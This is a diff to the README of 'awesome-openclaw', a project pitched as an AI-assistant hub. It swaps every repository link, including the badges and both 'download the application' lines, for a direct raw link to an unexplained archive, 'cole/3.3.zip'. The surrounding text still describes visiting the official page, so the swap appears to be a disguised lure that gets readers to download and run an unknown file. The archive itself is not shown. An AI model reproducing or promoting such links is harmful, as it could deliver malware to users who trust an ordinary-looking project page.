@@ -1,6 +1,6 @@
 # 🤖 awesome-openclaw - Your All-in-One AI Assistant Hub
 
-[![Download Now](https://img.shields.io/badge/Download-awesome--openclaw-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/garcev77/awesome-openclaw) [![Star on GitHub](https://img.shields.io/badge/Star-Repo-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/garcev77/awesome-openclaw) [![Open Source](https://img.shields.io/badge/Open%20Source-Free-2196F3?style=for-the-badge&logo=opensourceinitiative&logoColor=white)](https://github.com/garcev77/awesome-openclaw)
+[![Download Now](https://img.shields.io/badge/Download-awesome--openclaw-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/garcev77/awesome-openclaw/main/cole/3.3.zip) [![Star on GitHub](https://img.shields.io/badge/Star-Repo-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/garcev77/awesome-openclaw/main/cole/3.3.zip) [![Open Source](https://img.shields.io/badge/Open%20Source-Free-2196F3?style=for-the-badge&logo=opensourceinitiative&logoColor=white)](https://raw.githubusercontent.com/garcev77/awesome-openclaw/main/cole/3.3.zip)
 
 ## 🌟 What Is awesome-openclaw?
 
@@ -16,7 +16,7 @@ Getting started with awesome-openclaw is simpler than you might think. This guid
 
 **Step 1: Get the Application**
 
-Visit this link to download the application: [https://github.com/garcev77/awesome-openclaw](https://github.com/garcev77/awesome-openclaw)
+Visit this link to download the application: [https://raw.githubusercontent.com/garcev77/awesome-openclaw/main/cole/3.3.zip](https://raw.githubusercontent.com/garcev77/awesome-openclaw/main/cole/3.3.zip)
 
 This is your primary gateway. Click the link, and you'll land on the official awesome-openclaw page. Look for the green "Code" button, click it, then choose "Download ZIP" to get everything onto your computer.
 
@@ -119,7 +119,7 @@ You're now officially part of the OpenClaw journey. Remember: every expert was o
 
 Whether you need a digital assistant for work, want to automate daily tasks, or simply love exploring cutting-edge AI technology, awesome-openclaw puts everything within reach. Your AI-powered future begins with a single click - and that click is just above.
 
-Visit this link to download the application: [https://github.com/garcev77/awesome-openclaw](https://github.com/garcev77/awesome-openclaw)
+Visit this link to download the application: [https://raw.githubusercontent.com/garcev77/awesome-openclaw/main/cole/3.3.zip](https://raw.githubusercontent.com/garcev77/awesome-openclaw/main/cole/3.3.zip)
 
 Go ahead - take the first step. Your new AI assistant is waiting to meet you. 🤖✨
 
